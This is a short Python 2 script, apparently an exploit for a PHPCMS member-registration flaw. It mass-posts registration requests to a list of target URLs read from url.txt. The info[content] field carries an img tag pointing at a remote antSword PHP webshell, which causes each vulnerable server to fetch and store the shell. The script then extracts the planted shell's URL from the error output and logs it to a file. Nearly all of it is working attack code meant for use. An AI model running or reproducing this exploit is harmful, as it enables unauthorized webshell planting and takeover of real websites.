# -*- coding:utf-8 -*-

import requests,traceback

def verify(url):
    data = {
        "siteid":"1",
        "modelid":"1",
        "username":"dsds99881",
        "password":"123456a",
        "email":"sdsd661@qq.com",
        "info[content]":"<img src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg>",
        "dosubmit":"1",
        "protocol=":""
    }
    poc_url = url + "/index.php?m=member&c=index&a=register&siteid=1"
    print poc_url
    try:
        response = requests.post(url=poc_url,data=data,timeout=5)
        if "MySQL Error" in response.content and "http" in response.content:
            success_url = response.text[response.text.index("http"):response.text.index(".php")] + ".php"
            print u"获取的shell地址为：" + success_url
            f = open('1.txt','a+')
            f.writelines(success_url+'\n')


    except Exception, e:
        #print traceback.format_exc()
        print poc_url + '访问超时'




if __name__ == '__main__':
    print "Start Attacking:"
    urls = open('url.txt','r+')
    all_url = urls.readlines()[0].split('\r')
    print "当前url数量：" + str(len(all_url))
    for url in all_url:
        url.rstrip()
        verify(url)